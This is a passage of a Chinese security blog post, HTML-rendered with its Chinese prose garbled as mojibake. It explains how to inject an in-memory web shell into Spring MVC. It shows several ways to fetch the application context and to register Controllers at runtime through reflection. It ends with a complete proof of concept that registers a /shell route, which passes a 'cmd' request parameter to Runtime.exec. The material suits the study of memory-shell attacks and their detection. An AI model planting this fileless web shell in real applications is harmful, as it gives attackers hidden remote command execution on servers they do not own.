href="#è·å–ä¸Šä¸‹æ–‡ç¯å¢ƒContext" class="headerlink" title="è·å–ä¸Šä¸‹æ–‡ç¯å¢ƒContext"></a>è·å–ä¸Šä¸‹æ–‡ç¯å¢ƒContext</h4><p>æœ‰å››ç§æ–¹æ³•</p><h5 id="getCurrentWebApplicationContext"><a href="#getCurrentWebApplicationContext" class="headerlink" title="getCurrentWebApplicationContext"></a><strong>getCurrentWebApplicationContext</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> ContextLoader.getCurrentWebApplicationContext();<br></code></pre></td></tr></table></figure><p><code>getCurrentWebApplicationContext</code> è·å¾—çš„æ˜¯ä¸€ä¸ª <code>XmlWebApplicationContext</code> å®ä¾‹ç±»å‹çš„ <code>Root WebApplicationContext</code>ã€‚</p><h5 id="WebApplicationContextUtils"><a href="#WebApplicationContextUtils" class="headerlink" title="WebApplicationContextUtils"></a>WebApplicationContextUtils</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());<br></code></pre></td></tr></table></figure><p><em>é€šè¿‡è¿™ç§æ–¹æ³•è·å¾—çš„ä¹Ÿæ˜¯ä¸€ä¸ª</em> <code>Root WebApplicationContext</code>ã€‚å…¶ä¸­ <code>WebApplicationContextUtils.getWebApplicationContext</code> å‡½æ•°ä¹Ÿå¯ä»¥ç”¨ <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>æ¥æ›¿æ¢ã€‚</p><h5 id="RequestContextUtils"><a href="#RequestContextUtils" class="headerlink" title="RequestContextUtils"></a><strong>RequestContextUtils</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());<br></code></pre></td></tr></table></figure><p><em>é€šè¿‡</em> <code>ServletRequest</code> <em>ç±»çš„å®ä¾‹æ¥è·å¾—</em> <code>Child WebApplicationContext</code>ã€‚</p><h5 id="getAttribute"><a href="#getAttribute" class="headerlink" title="getAttribute"></a><strong>getAttribute</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>è¿™ç§æ–¹å¼ä¸å‰å‡ ç§çš„æ€è·¯å°±ä¸å¤ªä¸€æ ·äº†ï¼Œå› ä¸ºæ‰€æœ‰çš„Contextåœ¨åˆ›å»ºåï¼Œéƒ½ä¼šè¢«ä½œä¸ºä¸€ä¸ªå±æ€§æ·»åŠ åˆ°äº†ServletContextä¸­ã€‚æ‰€ä»¥é€šè¿‡ç›´æ¥è·å¾—ServletContexté€šè¿‡å±æ€§Contextæ‹¿åˆ° Child WebApplicationContext</p><h4 id="åŠ¨æ€æ³¨å†ŒController"><a href="#åŠ¨æ€æ³¨å†ŒController" class="headerlink" title="åŠ¨æ€æ³¨å†ŒController"></a>åŠ¨æ€æ³¨å†ŒController</h4><p>Spring Controller çš„åŠ¨æ€æ³¨å†Œï¼Œå°±æ˜¯å¯¹ <code>RequestMappingHandlerMapping</code> æ³¨å…¥çš„è¿‡ç¨‹ã€‚</p><p><code>RequestMappingHandlerMapping</code>æ˜¯springMVCé‡Œé¢çš„æ ¸å¿ƒBeanï¼ŒspringæŠŠæˆ‘ä»¬çš„controllerè§£ææˆ<code>RequestMappingInfo</code>å¯¹è±¡ï¼Œç„¶åå†æ³¨å†Œè¿›<code>RequestMappingHandlerMapping</code>ä¸­ï¼Œè¿™æ ·è¯·æ±‚è¿›æ¥ä»¥åå°±å¯ä»¥æ ¹æ®è¯·æ±‚åœ°å€è°ƒç”¨åˆ°Controllerç±»é‡Œé¢äº†ã€‚</p><ul><li>RequestMappingHandlerMappingå¯¹è±¡æœ¬èº«æ˜¯springæ¥ç®¡ç†çš„ï¼Œå¯ä»¥é€šè¿‡ApplicationContextå–åˆ°ï¼Œæ‰€ä»¥å¹¶ä¸éœ€è¦æˆ‘ä»¬æ–°å»ºã€‚</li><li>åœ¨SpringMVCæ¡†æ¶ä¸‹ï¼Œä¼šæœ‰ä¸¤ä¸ªApplicationContextï¼Œä¸€ä¸ªæ˜¯Spring IOCçš„ä¸Šä¸‹æ–‡ï¼Œè¿™ä¸ªæ˜¯åœ¨java webæ¡†æ¶çš„Listeneré‡Œé¢é…ç½®ï¼Œå°±æ˜¯æˆ‘ä»¬ç»å¸¸ç”¨çš„web.xmlé‡Œé¢çš„<code>org.springframework.web.context.ContextLoaderListener</code>ï¼Œç”±å®ƒæ¥å®ŒæˆIOCå®¹å™¨çš„åˆå§‹åŒ–å’Œbeanå¯¹è±¡çš„æ³¨å…¥ã€‚</li><li>å¦å¤–ä¸€ä¸ªæ˜¯ApplicationContextæ˜¯ç”±<code>org.springframework.web.servlet.DispatcherServlet</code>å®Œæˆçš„ï¼Œå…·ä½“æ˜¯åœ¨<code>org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()</code>è¿™ä¸ªæ–¹æ³•åšçš„ã€‚è€Œè¿™ä¸ªè¿‡ç¨‹é‡Œé¢ä¼šå®ŒæˆRequestMappingHandlerMappingè¿™ä¸ªå¯¹è±¡çš„åˆå§‹åŒ–ã€‚</li></ul><p>Spring 2.5 å¼€å§‹åˆ° Spring 3.1 ä¹‹å‰ä¸€èˆ¬ä½¿ç”¨<br><code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br>æ˜ å°„å™¨ ï¼›</p><p>Spring 3.1 å¼€å§‹åŠä»¥åä¸€èˆ¬å¼€å§‹ä½¿ç”¨æ–°çš„<br><code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code><br>æ˜ å°„å™¨æ¥æ”¯æŒ@Contollerå’Œ@RequestMappingæ³¨è§£ã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-56.png" alt="img43"></p><h5 id="registerMapping"><a href="#registerMapping" class="headerlink" title="registerMapping"></a>registerMapping</h5><p>åœ¨Spring 4.0åŠä»¥åï¼Œå¯ä»¥ä½¿ç”¨registerMappingç›´æ¥æ³¨å†ŒrequestMapping</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean</span><br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">// 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> (Class.forName(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>).getDeclaredMethods())[<span class="hljs-number">0</span>];<br><span class="hljs-comment">// 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€</span><br><span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/hahaha&quot;</span>);<br><span class="hljs-comment">// 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰</span><br><span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><span class="hljs-comment">// 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller</span><br><span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>r.registerMapping(info, Class.forName(<span class="hljs-string">&quot;æ¶æ„Controller&quot;</span>).newInstance(), method);<br></code></pre></td></tr></table></figure><h5 id="registerHandler"><a href="#registerHandler" class="headerlink" title="registerHandler"></a>registerHandler</h5><p>å‚è€ƒä¸Šé¢çš„ <code>HandlerMapping</code> æ¥å£ç»§æ‰¿å…³ç³»å›¾ï¼Œé’ˆå¯¹ä½¿ç”¨ <code>DefaultAnnotationHandlerMapping</code> æ˜ å°„å™¨çš„åº”ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒç»§æ‰¿çš„é¡¶å±‚ç±»<code>org.springframework.web.servlet.handler.AbstractUrlHandlerMapping</code></p><p>åœ¨å…¶<code>registerHandler()</code>æ–¹æ³•ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerHandler</span><span class="hljs-params">(String urlPath, Object handler)</span> <span class="hljs-keyword">throws</span> BeansException, IllegalStateException &#123;<br>Assert.notNull(urlPath, <span class="hljs-string">&quot;URL path must not be null&quot;</span>);<br>Assert.notNull(handler, <span class="hljs-string">&quot;Handler object must not be null&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">resolvedHandler</span> <span class="hljs-operator">=</span> handler;<br><br><span class="hljs-comment">// Eagerly resolve handler if referencing singleton via name.</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.lazyInitHandlers &amp;&amp; handler <span class="hljs-keyword">instanceof</span> String) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">handlerName</span> <span class="hljs-operator">=</span> (String) handler;<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> obtainApplicationContext();<br><span class="hljs-keyword">if</span> (applicationContext.isSingleton(handlerName)) &#123;<br>resolvedHandler = applicationContext.getBean(handlerName);<br>&#125;<br>&#125;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.handlerMap.get(urlPath);<br><span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (mappedHandler != resolvedHandler) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Cannot map &quot;</span> + getHandlerDescription(handler) + <span class="hljs-string">&quot; to URL path [&quot;</span> + urlPath +<br><span class="hljs-string">&quot;]: There is already &quot;</span> + getHandlerDescription(mappedHandler) + <span class="hljs-string">&quot; mapped.&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (urlPath.equals(<span class="hljs-string">&quot;/&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>logger.trace(<span class="hljs-string">&quot;Root mapping to &quot;</span> + getHandlerDescription(handler));<br>&#125;<br>setRootHandler(resolvedHandler);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (urlPath.equals(<span class="hljs-string">&quot;/*&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>logger.trace(<span class="hljs-string">&quot;Default mapping to &quot;</span> + getHandlerDescription(handler));<br>&#125;<br>setDefaultHandler(resolvedHandler);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">this</span>.handlerMap.put(urlPath, resolvedHandler);<br><span class="hljs-keyword">if</span> (getPatternParser() != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.pathPatternHandlerMap.put(getPatternParser().parse(urlPath), resolvedHandler);<br>&#125;<br><span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>logger.trace(<span class="hljs-string">&quot;Mapped [&quot;</span> + urlPath + <span class="hljs-string">&quot;] onto &quot;</span> + getHandlerDescription(handler));<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•æ¥å— <code>urlPath</code>å‚æ•°å’Œ <code>handler</code>å‚æ•°ï¼Œå¯ä»¥åœ¨ <code>this.getApplicationContext()</code> è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸º <code>handler</code> å‚æ•°å€¼çš„ <code>bean</code>, å°† url å’Œ controller å®ä¾‹ bean æ³¨å†Œåˆ° <code>handlerMap</code> ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. åœ¨å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ³¨å†Œä¸€ä¸ªåä¸º dynamicController çš„ Webshell controller å®ä¾‹ bean</span><br>context.getBeanFactory().registerSingleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.forName(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>).newInstance());<br><span class="hljs-comment">// 2. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— DefaultAnnotationHandlerMapping çš„å®ä¾‹ bean</span><br>org.springframework.web.servlet.mvc.annotation.<span class="hljs-type">DefaultAnnotationHandlerMapping</span>  <span class="hljs-variable">dh</span> <span class="hljs-operator">=</span> context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);<br><span class="hljs-comment">// 3. åå°„è·å¾— registerHandler Method</span><br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(<span class="hljs-string">&quot;registerHandler&quot;</span>, String.class, Object.class);<br>m1.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 4. å°† dynamicController å’Œ URL æ³¨å†Œåˆ° handlerMap ä¸­</span><br>m1.invoke(dh, <span class="hljs-string">&quot;/favicon&quot;</span>, <span class="hljs-string">&quot;dynamicController&quot;</span>);<br></code></pre></td></tr></table></figure><h5 id="detectHandlerMethods"><a href="#detectHandlerMethods" class="headerlink" title="detectHandlerMethods"></a>detectHandlerMethods</h5><p>å‚è€ƒä¸Šé¢çš„ <code>HandlerMapping</code> æ¥å£ç»§æ‰¿å…³ç³»å›¾ï¼Œé’ˆå¯¹ä½¿ç”¨ <code>RequestMappingHandlerMapping</code> æ˜ å°„å™¨çš„åº”ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒç»§æ‰¿çš„é¡¶å±‚ç±»<code>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping</code></p><p>åœ¨å…¶<code>detectHandlerMethods()</code> æ–¹æ³•ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">detectHandlerMethods</span><span class="hljs-params">(Object handler)</span> &#123;<br>    Class&lt;?&gt; handlerType = handler <span class="hljs-keyword">instanceof</span> String ? <span class="hljs-built_in">this</span>.getApplicationContext().getType((String)handler) : handler.getClass();<br>    <span class="hljs-keyword">final</span> Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);<br>    Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodFilter</span>() &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">matches</span><span class="hljs-params">(Method method)</span> &#123;<br>            <span class="hljs-keyword">return</span> AbstractHandlerMethodMapping.<span class="hljs-built_in">this</span>.getMappingForMethod(method, userType) != <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;);<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> methods.iterator();<br>    <span class="hljs-keyword">while</span>(var6.hasNext()) &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> (Method)var6.next();<br>        <span class="hljs-type">T</span> <span class="hljs-variable">mapping</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getMappingForMethod(method, userType);<br>        <span class="hljs-built_in">this</span>.registerHandlerMethod(handler, method, mapping);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•ä»…æ¥å—<code>handler</code>å‚æ•°ï¼ŒåŒæ ·å¯ä»¥åœ¨ <code>this.getApplicationContext()</code> è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸º <code>handler</code> å‚æ•°å€¼çš„ <code>bean</code>, å¹¶æ³¨å†Œ <code>controller</code> çš„å®ä¾‹ <code>bean</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">context.getBeanFactory().registerSingleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.forName(<span class="hljs-string">&quot;æ¶æ„Controller&quot;</span>).newInstance());<br>org.springframework.web.servlet.mvc.method.annotation.<span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">requestMappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);<br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(<span class="hljs-string">&quot;detectHandlerMethods&quot;</span>, Object.class);<br>m1.setAccessible(<span class="hljs-literal">true</span>);<br>m1.invoke(requestMappingHandlerMapping, <span class="hljs-string">&quot;dynamicController&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="å®ç°æ¶æ„Controller"><a href="#å®ç°æ¶æ„Controller" class="headerlink" title="å®ç°æ¶æ„Controller"></a>å®ç°æ¶æ„Controller</h4><p>è¿™é‡Œç”±äºæˆ‘ä»¬æ—¶åŠ¨æ€æ³¨å†ŒControllerï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å®ç°å¯¹åº”çš„æ¶æ„æ–¹æ³•å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Controller_Shell</span><span class="hljs-params">()</span>&#123;&#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br> <br>            <span class="hljs-comment">//è·å–request</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>            Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´POC-4"><a href="#å®Œæ•´POC-4" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_controller</span> &#123;<br> <br><span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/control&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Spring_Controller</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;<br> <br>        <span class="hljs-comment">//è·å–å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span><br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br> <br>        <span class="hljs-comment">//æ‰‹åŠ¨æ³¨å†ŒController</span><br>        <span class="hljs-comment">// 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Controller_Shell.class.getDeclaredMethod(<span class="hljs-string">&quot;shell&quot;</span>);<br>        <span class="hljs-comment">// 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€</span><br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-comment">// 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰</span><br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-comment">// 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller</span><br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        r.registerMapping(info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Controller_Shell</span>(), method);<br> <br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Controller_Shell</span><span class="hljs-params">()</span>&#123;&#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br> <br>            <span class="hljs-comment">//è·å–request</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>            Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>        &#125;<br>    &#125;<br> <br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè®¿é—®<code>/control</code>è·¯ç”±ï¼Œç”±äºControlleré»˜è®¤ä¼šå°†ç»“æœäº¤ç»™Viewå¤„ç†ï¼Œè¿”å›å€¼é€šå¸¸ä¼šè¢«è§£ææˆä¸€ä¸ªé¡µé¢è·¯å¾„ï¼Œæ‰€ä»¥è¿™é‡Œä¼šæŠ¥404é”™è¯¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>@ResponeBody</code>æ¥å°†Controllerçš„æ–¹æ³•è¿”å›çš„å¯¹è±¡ï¼Œé€šè¿‡é€‚å½“çš„HttpMessageConverterè½¬æ¢ä¸ºæŒ‡å®šæ ¼å¼åï¼Œå†™å…¥åˆ°Responseå¯¹è±¡çš„bodyæ•°æ®åŒºã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-62.png" 